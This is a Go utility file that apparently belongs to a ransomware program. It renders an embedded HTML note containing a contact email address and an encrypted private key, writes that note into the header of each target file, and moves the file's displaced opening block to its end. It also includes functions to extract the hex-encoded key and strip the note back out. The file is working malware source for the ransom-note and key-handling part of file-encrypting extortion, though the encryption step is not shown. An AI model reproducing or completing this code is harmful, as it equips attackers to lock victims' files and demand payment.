package utils

import (
	_ "embed"
	"encoding/binary"
	"os"
	"regexp"

	"github.com/kluctl/go-jinja2"
)

func check(e error) {
	if e != nil {
		panic(e)
	}
}

//go:embed message.html.jinja
var message_template []byte

func GetEncPrivKeyFromFile(file_path string) string {
	length := make([]byte, 4)
	f, err := os.OpenFile(file_path, os.O_RDWR, 0644)
	check(err)
	defer f.Close()
	f.ReadAt(length, 0)

	header_len := int(binary.LittleEndian.Uint32(length[:4]))
	header := make([]byte, header_len-4)
	f.ReadAt(header, 4)

	r, _ := regexp.Compile("[a-f0-9]{1000,}")

	return r.FindString(string(header))

}

func GenerateMsg(email_addr string, encrypted_key string) []byte {
	j2, err := jinja2.NewJinja2("example", 1,
		jinja2.WithGlobal("email_addr", email_addr),
		jinja2.WithGlobal("encrypted_key", encrypted_key))
	check(err)
	defer j2.Close()
	s, err := j2.RenderString(string(message_template))
	check(err)
	return []byte(s)
}

func StripMsgToFile(file_path string) {
	length := make([]byte, 4)
	f, err := os.OpenFile(file_path, os.O_RDWR, 0644)
	check(err)
	defer f.Close()
	f_stat, err := (*f).Stat()
	check(err)
	f.ReadAt(length, 0)
	header_len := int(binary.LittleEndian.Uint32(length))

	if f_stat.Size() < int64(2*header_len) {
		original_content := make([]byte, f_stat.Size()-int64(header_len))
		_, err = f.ReadAt(original_content, int64(header_len))
		check(err)
		f.WriteAt(original_content, 0)
		f.Truncate(int64(len(original_content)))
	} else {
		first_bloc := make([]byte, header_len)
		f.ReadAt(first_bloc, f_stat.Size()-int64(header_len))
		f.WriteAt(first_bloc, 0)
		f.Truncate(f_stat.Size() - int64(header_len))
	}
}

func AddMsgToFile(file_path string, email_addr string, encrypted_key string) {
	msg := GenerateMsg(email_addr, encrypted_key)
	length := make([]byte, 4)
	binary.LittleEndian.PutUint32(length, uint32(len(msg)+len(length)))
	msg = append(length, msg...)
	f, err := os.OpenFile(file_path, os.O_RDWR, 0644)
	check(err)
	defer f.Close()
	f_stat, err := (*f).Stat()
	check(err)
	if f_stat.Size() < int64(len(msg)) { // File is smaller than the message
		file_content := make([]byte, f_stat.Size())
		f.ReadAt(file_content, 0)
		f.WriteAt(msg, 0)
		f.WriteAt(file_content, int64(len(msg)))
	} else {
		first_bloc := make([]byte, len(msg))
		f.ReadAt(first_bloc, 0)
		f.WriteAt(first_bloc, f_stat.Size())
		f.WriteAt(msg, 0)
	}
}
